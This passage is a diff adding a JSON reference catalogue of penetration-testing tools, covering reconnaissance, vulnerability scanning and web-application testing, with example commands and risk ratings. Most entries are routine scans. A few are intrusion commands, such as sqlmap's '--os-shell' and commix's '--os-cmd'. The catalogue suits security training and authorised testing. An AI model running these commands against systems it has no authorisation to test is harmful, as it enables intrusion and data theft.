@@ -1,0 +1,3216 @@
+{
+  "categories": [
+    {
+      "name": "Information Gathering",
+      "tools": [
+        {
+          "name": "Nmap",
+          "category": "Information Gathering",
+          "description": "Network exploration and port scanner",
+          "installation": "sudo apt install nmap",
+          "syntax": "nmap [options] <target>",
+          "commands": [
+            {
+              "cmd": "nmap -sV <target>",
+              "explanation": "Detect service versions"
+            },
+            {
+              "cmd": "nmap -sS <target>",
+              "explanation": "TCP SYN stealth scan"
+            },
+            {
+              "cmd": "nmap -O <target>",
+              "explanation": "OS detection"
+            },
+            {
+              "cmd": "nmap -A <target>",
+              "explanation": "Aggressive scan with OS and version detection"
+            },
+            {
+              "cmd": "nmap -p- <target>",
+              "explanation": "Scan all 65535 ports"
+            }
+          ],
+          "use_cases": [
+            "Port scanning",
+            "Network discovery",
+            "Security auditing"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Whois",
+          "category": "Information Gathering",
+          "description": "Domain registration lookup tool",
+          "installation": "sudo apt install whois",
+          "syntax": "whois <domain>",
+          "commands": [
+            {
+              "cmd": "whois example.com",
+              "explanation": "Query domain registration info"
+            },
+            {
+              "cmd": "whois -h whois.arin.net <IP>",
+              "explanation": "Query IP ownership via ARIN"
+            },
+            {
+              "cmd": "whois -H example.com",
+              "explanation": "Suppress legal disclaimers"
+            }
+          ],
+          "use_cases": [
+            "Domain reconnaissance",
+            "Identifying registrars",
+            "Finding contact info"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "DNSenum",
+          "category": "Information Gathering",
+          "description": "DNS enumeration tool",
+          "installation": "sudo apt install dnsenum",
+          "syntax": "dnsenum <domain>",
+          "commands": [
+            {
+              "cmd": "dnsenum example.com",
+              "explanation": "Enumerate DNS records"
+            },
+            {
+              "cmd": "dnsenum --enum example.com",
+              "explanation": "Full enumeration with brute force"
+            },
+            {
+              "cmd": "dnsenum -f wordlist.txt example.com",
+              "explanation": "Brute force subdomains with wordlist"
+            }
+          ],
+          "use_cases": [
+            "DNS record enumeration",
+            "Subdomain discovery",
+            "Zone transfer testing"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Enum4linux",
+          "category": "Information Gathering",
+          "description": "Windows/Samba enumeration tool",
+          "installation": "sudo apt install enum4linux",
+          "syntax": "enum4linux [options] <target>",
+          "commands": [
+            {
+              "cmd": "enum4linux -a <target>",
+              "explanation": "Full enumeration"
+            },
+            {
+              "cmd": "enum4linux -U <target>",
+              "explanation": "List users"
+            },
+            {
+              "cmd": "enum4linux -S <target>",
+              "explanation": "List shares"
+            }
+          ],
+          "use_cases": [
+            "SMB enumeration",
+            "User discovery",
+            "Share enumeration"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "SMBClient",
+          "category": "Information Gathering",
+          "description": "SMB/CIFS file sharing client",
+          "installation": "sudo apt install smbclient",
+          "syntax": "smbclient //<target>/<share> [options]",
+          "commands": [
+            {
+              "cmd": "smbclient -L //<target>",
+              "explanation": "List available shares"
+            },
+            {
+              "cmd": "smbclient //<target>/<share> -U user",
+              "explanation": "Connect to a share"
+            },
+            {
+              "cmd": "smbclient //<target>/<share> -N",
+              "explanation": "Connect with null session"
+            }
+          ],
+          "use_cases": [
+            "Accessing SMB shares",
+            "File transfer",
+            "Share enumeration"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "theHarvester",
+          "category": "Information Gathering",
+          "description": "Email and subdomain harvester",
+          "installation": "sudo apt install theharvester",
+          "syntax": "theHarvester -d <domain> -b <source>",
+          "commands": [
+            {
+              "cmd": "theHarvester -d example.com -b google",
+              "explanation": "Harvest from Google"
+            },
+            {
+              "cmd": "theHarvester -d example.com -b all",
+              "explanation": "Harvest from all sources"
+            },
+            {
+              "cmd": "theHarvester -d example.com -b linkedin",
+              "explanation": "Harvest from LinkedIn"
+            }
+          ],
+          "use_cases": [
+            "Email harvesting",
+            "Subdomain enumeration",
+            "OSINT gathering"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Maltego",
+          "category": "Information Gathering",
+          "description": "Visual link analysis and OSINT platform",
+          "installation": "sudo apt install maltego",
+          "syntax": "maltego (GUI application)",
+          "commands": [
+            {
+              "cmd": "maltego",
+              "explanation": "Launch GUI"
+            },
+            {
+              "cmd": "Transform: Domain to DNS",
+              "explanation": "Resolve domain DNS records"
+            },
+            {
+              "cmd": "Transform: Email to Person",
+              "explanation": "Link email to identity"
+            }
+          ],
+          "use_cases": [
+            "OSINT visualization",
+            "Relationship mapping",
+            "Threat intelligence"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "WhatWeb",
+          "category": "Information Gathering",
+          "description": "Web technology fingerprinting tool",
+          "installation": "sudo apt install whatweb",
+          "syntax": "whatweb <target>",
+          "commands": [
+            {
+              "cmd": "whatweb example.com",
+              "explanation": "Identify web technologies"
+            },
+            {
+              "cmd": "whatweb -a 3 example.com",
+              "explanation": "Aggressive scan"
+            },
+            {
+              "cmd": "whatweb -v example.com",
+              "explanation": "Verbose output"
+            }
+          ],
+          "use_cases": [
+            "Web technology identification",
+            "CMS detection",
+            "Server fingerprinting"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Recon-ng",
+          "category": "Information Gathering",
+          "description": "Web reconnaissance framework",
+          "installation": "sudo apt install recon-ng",
+          "syntax": "recon-ng",
+          "commands": [
+            {
+              "cmd": "recon-ng",
+              "explanation": "Launch framework"
+            },
+            {
+              "cmd": "marketplace search <keyword>",
+              "explanation": "Search for modules"
+            },
+            {
+              "cmd": "modules load <module>",
+              "explanation": "Load a module"
+            }
+          ],
+          "use_cases": [
+            "OSINT automation",
+            "Subdomain enumeration",
+            "Contact harvesting"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Amass",
+          "category": "Information Gathering",
+          "description": "In-depth DNS enumeration and network mapping",
+          "installation": "sudo apt install amass",
+          "syntax": "amass enum -d <domain>",
+          "commands": [
+            {
+              "cmd": "amass enum -d example.com",
+              "explanation": "Passive enumeration"
+            },
+            {
+              "cmd": "amass enum -active -d example.com",
+              "explanation": "Active enumeration"
+            },
+            {
+              "cmd": "amass intel -whois -d example.com",
+              "explanation": "Discover related domains"
+            }
+          ],
+          "use_cases": [
+            "Subdomain enumeration",
+            "Attack surface mapping",
+            "Asset discovery"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Subfinder",
+          "category": "Information Gathering",
+          "description": "Fast passive subdomain discovery tool",
+          "installation": "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
+          "syntax": "subfinder -d <domain>",
+          "commands": [
+            {
+              "cmd": "subfinder -d example.com",
+              "explanation": "Find subdomains"
+            },
+            {
+              "cmd": "subfinder -d example.com -o out.txt",
+              "explanation": "Save results to file"
+            },
+            {
+              "cmd": "subfinder -dL domains.txt",
+              "explanation": "Enumerate from domain list"
+            }
+          ],
+          "use_cases": [
+            "Subdomain discovery",
+            "Bug bounty recon",
+            "Asset enumeration"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "httpx",
+          "category": "Information Gathering",
+          "description": "Fast HTTP probing tool",
+          "installation": "go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
+          "syntax": "httpx [options]",
+          "commands": [
+            {
+              "cmd": "cat subs.txt | httpx",
+              "explanation": "Probe live hosts"
+            },
+            {
+              "cmd": "httpx -l urls.txt -sc",
+              "explanation": "Show status codes"
+            },
+            {
+              "cmd": "httpx -l urls.txt -title",
+              "explanation": "Extract page titles"
+            }
+          ],
+          "use_cases": [
+            "HTTP probing",
+            "Live host detection",
+            "Web reconnaissance"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Fierce",
+          "category": "Information Gathering",
+          "description": "DNS reconnaissance and subdomain scanner",
+          "installation": "sudo apt install fierce",
+          "syntax": "fierce --domain <domain>",
+          "commands": [
+            {
+              "cmd": "fierce --domain example.com",
+              "explanation": "Scan for subdomains"
+            },
+            {
+              "cmd": "fierce --domain example.com --subdomains sub.txt",
+              "explanation": "Use custom wordlist"
+            },
+            {
+              "cmd": "fierce --domain example.com --dns-servers 8.8.8.8",
+              "explanation": "Use specific DNS server"
+            }
+          ],
+          "use_cases": [
+            "DNS recon",
+            "Subdomain brute forcing",
+            "Network mapping"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "DNSRecon",
+          "category": "Information Gathering",
+          "description": "DNS enumeration script",
+          "installation": "sudo apt install dnsrecon",
+          "syntax": "dnsrecon -d <domain>",
+          "commands": [
+            {
+              "cmd": "dnsrecon -d example.com",
+              "explanation": "Standard enumeration"
+            },
+            {
+              "cmd": "dnsrecon -d example.com -t axfr",
+              "explanation": "Attempt zone transfer"
+            },
+            {
+              "cmd": "dnsrecon -d example.com -t brt -D wordlist.txt",
+              "explanation": "Brute force subdomains"
+            }
+          ],
+          "use_cases": [
+            "DNS record enumeration",
+            "Zone transfer testing",
+            "Subdomain brute force"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Masscan",
+          "category": "Information Gathering",
+          "description": "Ultra-fast port scanner",
+          "installation": "sudo apt install masscan",
+          "syntax": "masscan <target> -p<ports>",
+          "commands": [
+            {
+              "cmd": "masscan 10.0.0.0/8 -p80 --rate=10000",
+              "explanation": "Scan port 80 at high speed"
+            },
+            {
+              "cmd": "masscan <target> -p0-65535",
+              "explanation": "Scan all ports"
+            },
+            {
+              "cmd": "masscan <target> -p80,443 --banners",
+              "explanation": "Grab banners"
+            }
+          ],
+          "use_cases": [
+            "Large-scale port scanning",
+            "Network-wide discovery",
+            "Internet-scale scanning"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "RustScan",
+          "category": "Information Gathering",
+          "description": "Fast port scanner written in Rust",
+          "installation": "cargo install rustscan",
+          "syntax": "rustscan -a <target>",
+          "commands": [
+            {
+              "cmd": "rustscan -a <target>",
+              "explanation": "Quick scan all ports"
+            },
+            {
+              "cmd": "rustscan -a <target> -- -sV",
+              "explanation": "Pipe to nmap for version scan"
+            },
+            {
+              "cmd": "rustscan -a <target> -b 1000",
+              "explanation": "Set batch size"
+            }
+          ],
+          "use_cases": [
+            "Fast port scanning",
+            "Nmap integration",
+            "Network recon"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "DMitry",
+          "category": "Information Gathering",
+          "description": "Deepmagic information gathering tool",
+          "installation": "sudo apt install dmitry",
+          "syntax": "dmitry [options] <target>",
+          "commands": [
+            {
+              "cmd": "dmitry -winse example.com",
+              "explanation": "Full information gathering"
+            },
+            {
+              "cmd": "dmitry -p <target>",
+              "explanation": "Port scan"
+            },
+            {
+              "cmd": "dmitry -s example.com",
+              "explanation": "Subdomain search"
+            }
+          ],
+          "use_cases": [
+            "Whois lookup",
+            "Port scanning",
+            "Subdomain search"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Shodan CLI",
+          "category": "Information Gathering",
+          "description": "Search engine for Internet-connected devices",
+          "installation": "pip install shodan",
+          "syntax": "shodan <command>",
+          "commands": [
+            {
+              "cmd": "shodan search apache",
+              "explanation": "Search for Apache servers"
+            },
+            {
+              "cmd": "shodan host <IP>",
+              "explanation": "Get host info"
+            },
+            {
+              "cmd": "shodan count vuln:CVE-2021-44228",
+              "explanation": "Count vulnerable hosts"
+            }
+          ],
+          "use_cases": [
+            "IoT discovery",
+            "Exposed service detection",
+            "Vulnerability research"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "SpiderFoot",
+          "category": "Information Gathering",
+          "description": "OSINT automation tool",
+          "installation": "pip install spiderfoot",
+          "syntax": "spiderfoot -l 127.0.0.1:5001",
+          "commands": [
+            {
+              "cmd": "spiderfoot -l 127.0.0.1:5001",
+              "explanation": "Start web UI"
+            },
+            {
+              "cmd": "spiderfoot -s example.com -t EMAILADDR",
+              "explanation": "Scan for emails"
+            },
+            {
+              "cmd": "spiderfoot -s example.com -m sfp_dns",
+              "explanation": "Run DNS module"
+            }
+          ],
+          "use_cases": [
+            "Automated OSINT",
+            "Threat intelligence",
+            "Attack surface mapping"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "SMBMap",
+          "category": "Information Gathering",
+          "description": "SMB share enumeration tool",
+          "installation": "sudo apt install smbmap",
+          "syntax": "smbmap -H <target>",
+          "commands": [
+            {
+              "cmd": "smbmap -H <target>",
+              "explanation": "List shares and permissions"
+            },
+            {
+              "cmd": "smbmap -H <target> -u user -p pass",
+              "explanation": "Authenticate and list"
+            },
+            {
+              "cmd": "smbmap -H <target> -r <share>",
+              "explanation": "Recursively list share contents"
+            }
+          ],
+          "use_cases": [
+            "SMB share mapping",
+            "Permission auditing",
+            "Data discovery"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "snmpwalk",
+          "category": "Information Gathering",
+          "description": "SNMP data collector",
+          "installation": "sudo apt install snmp",
+          "syntax": "snmpwalk -v <version> -c <community> <target>",
+          "commands": [
+            {
+              "cmd": "snmpwalk -v2c -c public <target>",
+              "explanation": "Walk SNMP tree"
+            },
+            {
+              "cmd": "snmpwalk -v2c -c public <target> system",
+              "explanation": "Get system info"
+            },
+            {
+              "cmd": "snmpwalk -v3 -u user -l authPriv <target>",
+              "explanation": "SNMPv3 authenticated walk"
+            }
+          ],
+          "use_cases": [
+            "Network device enumeration",
+            "Configuration auditing",
+            "Asset discovery"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "nbtscan",
+          "category": "Information Gathering",
+          "description": "NetBIOS name scanner",
+          "installation": "sudo apt install nbtscan",
+          "syntax": "nbtscan <target/range>",
+          "commands": [
+            {
+              "cmd": "nbtscan 192.168.1.0/24",
+              "explanation": "Scan subnet for NetBIOS names"
+            },
+            {
+              "cmd": "nbtscan -r 192.168.1.0/24",
+              "explanation": "Use local port 137"
+            },
+            {
+              "cmd": "nbtscan -v <target>",
+              "explanation": "Verbose output"
+            }
+          ],
+          "use_cases": [
+            "NetBIOS enumeration",
+            "Windows network discovery",
+            "Host identification"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "ldapsearch",
+          "category": "Information Gathering",
+          "description": "LDAP directory query tool",
+          "installation": "sudo apt install ldap-utils",
+          "syntax": "ldapsearch -x -H ldap://<target> -b <base>",
+          "commands": [
+            {
+              "cmd": "ldapsearch -x -H ldap://<target> -b 'dc=example,dc=com'",
+              "explanation": "Anonymous bind query"
+            },
+            {
+              "cmd": "ldapsearch -x -H ldap://<target> -D 'cn=admin' -W",
+              "explanation": "Authenticated query"
+            },
+            {
+              "cmd": "ldapsearch -x -H ldap://<target> -b 'dc=example,dc=com' '(objectClass=user)'",
+              "explanation": "Search for users"
+            }
+          ],
+          "use_cases": [
+            "Active Directory enumeration",
+            "User discovery",
+            "LDAP reconnaissance"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "dig",
+          "category": "Information Gathering",
+          "description": "DNS lookup utility",
+          "installation": "sudo apt install dnsutils",
+          "syntax": "dig <domain> [type]",
+          "commands": [
+            {
+              "cmd": "dig example.com",
+              "explanation": "Query A records"
+            },
+            {
+              "cmd": "dig example.com MX",
+              "explanation": "Query mail records"
+            },
+            {
+              "cmd": "dig @8.8.8.8 example.com ANY",
+              "explanation": "Query all records via Google DNS"
+            }
+          ],
+          "use_cases": [
+            "DNS troubleshooting",
+            "Record verification",
+            "DNS recon"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "traceroute",
+          "category": "Information Gathering",
+          "description": "Network path tracing tool",
+          "installation": "sudo apt install traceroute",
+          "syntax": "traceroute <target>",
+          "commands": [
+            {
+              "cmd": "traceroute example.com",
+              "explanation": "Trace route to host"
+            },
+            {
+              "cmd": "traceroute -T example.com",
+              "explanation": "TCP traceroute"
+            },
+            {
+              "cmd": "traceroute -n <target>",
+              "explanation": "Skip DNS resolution"
+            }
+          ],
+          "use_cases": [
+            "Network path analysis",
+            "Hop identification",
+            "Latency diagnosis"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "enum4linux-ng",
+          "category": "Information Gathering",
+          "description": "Next-gen Windows/Samba enumerator",
+          "installation": "pip install enum4linux-ng",
+          "syntax": "enum4linux-ng <target>",
+          "commands": [
+            {
+              "cmd": "enum4linux-ng <target>",
+              "explanation": "Full enumeration"
+            },
+            {
+              "cmd": "enum4linux-ng -A <target>",
+              "explanation": "Aggressive mode"
+            },
+            {
+              "cmd": "enum4linux-ng -U <target>",
+              "explanation": "Enumerate users"
+            }
+          ],
+          "use_cases": [
+            "SMB enumeration",
+            "AD reconnaissance",
+            "Share discovery"
+          ],
+          "risk_level": "Low"
+        }
+      ]
+    },
+    {
+      "name": "Vulnerability Analysis",
+      "tools": [
+        {
+          "name": "Nikto",
+          "category": "Vulnerability Analysis",
+          "description": "Web server vulnerability scanner",
+          "installation": "sudo apt install nikto",
+          "syntax": "nikto -h <target>",
+          "commands": [
+            {
+              "cmd": "nikto -h http://example.com",
+              "explanation": "Scan web server"
+            },
+            {
+              "cmd": "nikto -h <target> -ssl",
+              "explanation": "Force SSL mode"
+            },
+            {
+              "cmd": "nikto -h <target> -Tuning x",
+              "explanation": "Specific test type"
+            }
+          ],
+          "use_cases": [
+            "Web vulnerability scanning",
+            "Server misconfiguration detection",
+            "Compliance checking"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Nmap NSE",
+          "category": "Vulnerability Analysis",
+          "description": "Nmap Scripting Engine for vulnerability detection",
+          "installation": "sudo apt install nmap",
+          "syntax": "nmap --script <script> <target>",
+          "commands": [
+            {
+              "cmd": "nmap --script vuln <target>",
+              "explanation": "Run all vuln scripts"
+            },
+            {
+              "cmd": "nmap --script http-enum <target>",
+              "explanation": "Enumerate web directories"
+            },
+            {
+              "cmd": "nmap --script smb-vuln* <target>",
+              "explanation": "Check SMB vulnerabilities"
+            }
+          ],
+          "use_cases": [
+            "Automated vulnerability detection",
+            "Service enumeration",
+            "Exploit verification"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Nuclei",
+          "category": "Vulnerability Analysis",
+          "description": "Fast template-based vulnerability scanner",
+          "installation": "go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
+          "syntax": "nuclei -u <target>",
+          "commands": [
+            {
+              "cmd": "nuclei -u http://example.com",
+              "explanation": "Scan with all templates"
+            },
+            {
+              "cmd": "nuclei -u <target> -t cves/",
+              "explanation": "Scan CVE templates only"
+            },
+            {
+              "cmd": "nuclei -l urls.txt -s critical",
+              "explanation": "Scan list for critical vulns"
+            }
+          ],
+          "use_cases": [
+            "Automated vuln scanning",
+            "CVE detection",
+            "Bug bounty hunting"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "SSLScan",
+          "category": "Vulnerability Analysis",
+          "description": "SSL/TLS configuration scanner",
+          "installation": "sudo apt install sslscan",
+          "syntax": "sslscan <target>",
+          "commands": [
+            {
+              "cmd": "sslscan example.com",
+              "explanation": "Scan SSL/TLS config"
+            },
+            {
+              "cmd": "sslscan --no-failed example.com",
+              "explanation": "Show only accepted ciphers"
+            },
+            {
+              "cmd": "sslscan --xml=out.xml example.com",
+              "explanation": "Output as XML"
+            }
+          ],
+          "use_cases": [
+            "SSL/TLS auditing",
+            "Cipher analysis",
+            "Certificate validation"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "testssl.sh",
+          "category": "Vulnerability Analysis",
+          "description": "SSL/TLS testing tool",
+          "installation": "git clone https://github.com/drwetter/testssl.sh.git",
+          "syntax": "testssl.sh <target>",
+          "commands": [
+            {
+              "cmd": "./testssl.sh example.com",
+              "explanation": "Full SSL test"
+            },
+            {
+              "cmd": "./testssl.sh --vulnerable example.com",
+              "explanation": "Check known vulns"
+            },
+            {
+              "cmd": "./testssl.sh --headers example.com",
+              "explanation": "Check HTTP headers"
+            }
+          ],
+          "use_cases": [
+            "SSL vulnerability assessment",
+            "Compliance testing",
+            "Security auditing"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "OpenVAS",
+          "category": "Vulnerability Analysis",
+          "description": "Open vulnerability assessment system",
+          "installation": "sudo apt install openvas",
+          "syntax": "gvm-start",
+          "commands": [
+            {
+              "cmd": "gvm-start",
+              "explanation": "Start OpenVAS service"
+            },
+            {
+              "cmd": "gvm-cli --gmp-username admin --gmp-password pass socket --xml '<get_tasks/>'",
+              "explanation": "List scan tasks"
+            },
+            {
+              "cmd": "openvas-nasl -t <target> <script.nasl>",
+              "explanation": "Run single NASL script"
+            }
+          ],
+          "use_cases": [
+            "Enterprise vulnerability scanning",
+            "Compliance auditing",
+            "Risk assessment"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Lynis",
+          "category": "Vulnerability Analysis",
+          "description": "Security auditing tool for Linux",
+          "installation": "sudo apt install lynis",
+          "syntax": "lynis audit system",
+          "commands": [
+            {
+              "cmd": "lynis audit system",
+              "explanation": "Full system audit"
+            },
+            {
+              "cmd": "lynis audit system --pentest",
+              "explanation": "Pentest mode scan"
+            },
+            {
+              "cmd": "lynis show details <test-id>",
+              "explanation": "Show test details"
+            }
+          ],
+          "use_cases": [
+            "System hardening",
+            "Compliance auditing",
+            "Security benchmarking"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Nessus",
+          "category": "Vulnerability Analysis",
+          "description": "Professional vulnerability scanner",
+          "installation": "Download from tenable.com and dpkg -i Nessus.deb",
+          "syntax": "nessuscli <command>",
+          "commands": [
+            {
+              "cmd": "sudo /etc/init.d/nessusd start",
+              "explanation": "Start Nessus service"
+            },
+            {
+              "cmd": "nessuscli scan --targets=<target> --name=MyScan",
+              "explanation": "Create scan"
+            },
+            {
+              "cmd": "nessuscli update --all",
+              "explanation": "Update plugins"
+            }
+          ],
+          "use_cases": [
+            "Enterprise vulnerability management",
+            "Compliance scanning",
+            "Risk assessment"
+          ],
+          "risk_level": "Medium"
+        }
+      ]
+    },
+    {
+      "name": "Web Application Analysis",
+      "tools": [
+        {
+          "name": "SQLmap",
+          "category": "Web Application Analysis",
+          "description": "Automatic SQL injection and database takeover tool",
+          "installation": "sudo apt install sqlmap",
+          "syntax": "sqlmap -u <URL>",
+          "commands": [
+            {
+              "cmd": "sqlmap -u 'http://site.com/page?id=1'",
+              "explanation": "Test for SQL injection"
+            },
+            {
+              "cmd": "sqlmap -u <URL> --dbs",
+              "explanation": "Enumerate databases"
+            },
+            {
+              "cmd": "sqlmap -u <URL> -D db --tables",
+              "explanation": "List tables in database"
+            },
+            {
+              "cmd": "sqlmap -u <URL> --os-shell",
+              "explanation": "Get OS shell via SQLi"
+            }
+          ],
+          "use_cases": [
+            "SQL injection testing",
+            "Database extraction",
+            "Web app pentesting"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "Burp Suite",
+          "category": "Web Application Analysis",
+          "description": "Web application security testing platform",
+          "installation": "sudo apt install burpsuite",
+          "syntax": "burpsuite (GUI application)",
+          "commands": [
+            {
+              "cmd": "burpsuite",
+              "explanation": "Launch GUI"
+            },
+            {
+              "cmd": "Configure proxy: 127.0.0.1:8080",
+              "explanation": "Set browser proxy"
+            },
+            {
+              "cmd": "Target > Site map > Spider",
+              "explanation": "Crawl target site"
+            }
+          ],
+          "use_cases": [
+            "Web app pentesting",
+            "Intercepting requests",
+            "Vulnerability scanning"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Gobuster",
+          "category": "Web Application Analysis",
+          "description": "Directory and DNS brute-force tool",
+          "installation": "sudo apt install gobuster",
+          "syntax": "gobuster dir -u <URL> -w <wordlist>",
+          "commands": [
+            {
+              "cmd": "gobuster dir -u http://site.com -w /usr/share/wordlists/dirb/common.txt",
+              "explanation": "Directory brute force"
+            },
+            {
+              "cmd": "gobuster dns -d example.com -w subdomains.txt",
+              "explanation": "DNS subdomain brute force"
+            },
+            {
+              "cmd": "gobuster vhost -u http://site.com -w vhosts.txt",
+              "explanation": "Virtual host discovery"
+            }
+          ],
+          "use_cases": [
+            "Directory enumeration",
+            "Subdomain brute forcing",
+            "Content discovery"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "DIRB",
+          "category": "Web Application Analysis",
+          "description": "Web content scanner",
+          "installation": "sudo apt install dirb",
+          "syntax": "dirb <URL> [wordlist]",
+          "commands": [
+            {
+              "cmd": "dirb http://site.com",
+              "explanation": "Default wordlist scan"
+            },
+            {
+              "cmd": "dirb http://site.com /usr/share/wordlists/dirb/big.txt",
+              "explanation": "Custom wordlist"
+            },
+            {
+              "cmd": "dirb http://site.com -a 'Mozilla/5.0'",
+              "explanation": "Custom user agent"
+            }
+          ],
+          "use_cases": [
+            "Directory discovery",
+            "Web content enumeration",
+            "Hidden file detection"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "DirBuster",
+          "category": "Web Application Analysis",
+          "description": "Java-based directory brute forcer",
+          "installation": "sudo apt install dirbuster",
+          "syntax": "dirbuster (GUI application)",
+          "commands": [
+            {
+              "cmd": "dirbuster",
+              "explanation": "Launch GUI"
+            },
+            {
+              "cmd": "Set target URL and wordlist",
+              "explanation": "Configure scan"
+            },
+            {
+              "cmd": "Start scan and review results",
+              "explanation": "Execute brute force"
+            }
+          ],
+          "use_cases": [
+            "Directory brute forcing",
+            "Web content discovery",
+            "Path enumeration"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "FFUF",
+          "category": "Web Application Analysis",
+          "description": "Fast web fuzzer",
+          "installation": "sudo apt install ffuf",
+          "syntax": "ffuf -u <URL>/FUZZ -w <wordlist>",
+          "commands": [
+            {
+              "cmd": "ffuf -u http://site.com/FUZZ -w wordlist.txt",
+              "explanation": "Directory fuzzing"
+            },
+            {
+              "cmd": "ffuf -u http://site.com -H 'Host: FUZZ.site.com' -w subs.txt",
+              "explanation": "Vhost fuzzing"
+            },
+            {
+              "cmd": "ffuf -u http://site.com/FUZZ -w wordlist.txt -fc 404",
+              "explanation": "Filter 404 responses"
+            }
+          ],
+          "use_cases": [
+            "Web fuzzing",
+            "Content discovery",
+            "Parameter discovery"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "WafW00f",
+          "category": "Web Application Analysis",
+          "description": "Web Application Firewall detector",
+          "installation": "sudo apt install wafw00f",
+          "syntax": "wafw00f <URL>",
+          "commands": [
+            {
+              "cmd": "wafw00f http://example.com",
+              "explanation": "Detect WAF"
+            },
+            {
+              "cmd": "wafw00f -l",
+              "explanation": "List detectable WAFs"
+            },
+            {
+              "cmd": "wafw00f -a http://example.com",
+              "explanation": "Test all WAF signatures"
+            }
+          ],
+          "use_cases": [
+            "WAF detection",
+            "Security assessment",
+            "Bypass planning"
+          ],
+          "risk_level": "Low"
+        },
+        {
+          "name": "Wapiti",
+          "category": "Web Application Analysis",
+          "description": "Web application vulnerability scanner",
+          "installation": "sudo apt install wapiti",
+          "syntax": "wapiti -u <URL>",
+          "commands": [
+            {
+              "cmd": "wapiti -u http://site.com",
+              "explanation": "Full scan"
+            },
+            {
+              "cmd": "wapiti -u http://site.com -m xss",
+              "explanation": "XSS module only"
+            },
+            {
+              "cmd": "wapiti -u http://site.com -f html -o report",
+              "explanation": "Generate HTML report"
+            }
+          ],
+          "use_cases": [
+            "Automated web scanning",
+            "XSS/SQLi detection",
+            "Security auditing"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Commix",
+          "category": "Web Application Analysis",
+          "description": "Command injection exploitation tool",
+          "installation": "sudo apt install commix",
+          "syntax": "commix -u <URL>",
+          "commands": [
+            {
+              "cmd": "commix -u 'http://site.com/page?arg=val'",
+              "explanation": "Test for command injection"
+            },
+            {
+              "cmd": "commix -u <URL> --os-cmd='whoami'",
+              "explanation": "Execute OS command"
+            },
+            {
+              "cmd": "commix -u <URL> --level=3",
+              "explanation": "Increase detection level"
+            }
+          ],
+          "use_cases": [
+            "Command injection testing",
+            "RCE exploitation",
+            "Web app pentesting"
+          ],
+          "risk_level": "High"
+        },
+        {
+          "name": "XSSer",
+          "category": "Web Application Analysis",
+          "description": "Cross-site scripting testing framework",
+          "installation": "sudo apt install xsser",
+          "syntax": "xsser -u <URL>",
+          "commands": [
+            {
+              "cmd": "xsser -u 'http://site.com/page?q=test'",
+              "explanation": "Auto XSS test"
+            },
+            {
+              "cmd": "xsser --url <URL> --auto",
+              "explanation": "Automatic payload testing"
+            },
+            {
+              "cmd": "xsser --url <URL> -p 'q=XSS'",
+              "explanation": "Custom parameter test"
+            }
+          ],
+          "use_cases": [
+            "XSS vulnerability testing",
+            "Payload generation",
+            "Web security assessment"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "XSStrike",
+          "category": "Web Application Analysis",
+          "description": "Advanced XSS detection suite",
+          "installation": "pip install xsstrike",
+          "syntax": "xsstrike -u <URL>",
+          "commands": [
+            {
+              "cmd": "xsstrike -u 'http://site.com/page?q=test'",
+              "explanation": "Scan for XSS"
+            },
+            {
+              "cmd": "xsstrike -u <URL> --crawl",
+              "explanation": "Crawl and scan"
+            },
+            {
+              "cmd": "xsstrike -u <URL> --fuzzer",
+              "explanation": "Fuzz for XSS"
+            }
+          ],
+          "use_cases": [
+            "XSS detection",
+            "WAF bypass",
+            "Payload crafting"
+          ],
+          "risk_level": "Medium"
+        },
+        {
+          "name": "Arjun",
+          "category": "Web Application Analysis",
+          "description": "HTTP parameter discovery suite",
+          "installation": "pip install arjun",
+          "syntax": "arjun -u <URL>",
+          "commands": [
+            {
+              "cmd": "arjun -u http://site.com/page",
+              "explanation": "Discover hidden parameters"
+            },
+            {
+              "cmd": "arjun -u <URL> -m POST",
+              "explanation": "Test POST parameters"
+            },
+            {
+              "cmd": "arjun -u <URL> -w custom.txt",
+              "explanation": "Use custom wordlist"
+            }
+          ],
+          "use_cases": [
+            "Parameter discovery",
+            "Hidden input detection",
